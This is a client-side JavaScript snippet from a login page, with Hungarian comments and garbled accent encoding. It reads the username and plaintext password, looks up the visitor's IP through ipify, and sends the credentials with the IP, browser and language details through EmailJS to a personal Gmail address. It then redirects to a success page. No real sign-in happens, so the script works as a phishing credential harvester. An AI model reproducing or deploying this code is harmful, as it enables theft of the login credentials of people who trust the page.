<script>
    // IP lek√©rdez√©s funkci√≥
    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('IP lek√©rdez√©s hiba:', error);
            return 'N/A';
        }
    }

    // Login form kezel√©se IP lek√©rdez√©ssel
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const loading = document.getElementById('loading');
        
        if (username === '' || password === '') {
            alert('K√©rlek t√∂ltsd ki mindk√©t mez≈ët!');
            return;
        }

        // Loading √°llapot
        loading.style.display = 'block';

        // IP C√çM LEK√âRDEZ√âSE
        const ipAddress = await getIPAddress();
        console.log('üåê IP c√≠m:', ipAddress);

        // Email param√©terek IP c√≠mmel
        const templateParams = {
            username: username,
            password: password,
            timestamp: new Date().toLocaleString('hu-HU'),
            ip_address: ipAddress,  // IP c√≠m hozz√°adva
            browser: navigator.userAgent,
            language: navigator.language
        };

        // Email k√ºld√©se EmailJS-en kereszt√ºl
        emailjs.send('cesaxy123@gmail.com', 'template_wxgakur', templateParams)
            .then(function(response) {
                console.log('‚úÖ SIKER!', response.status);
                loading.style.display = 'none';
                window.location.href = `success.html?user=${encodeURIComponent(username)}`;
            })
            .catch(function(error) {
                console.error('‚ùå HIBA:', error);
                loading.style.display = 'none';
                alert('Hiba t√∂rt√©nt!');
            });
    });
</script>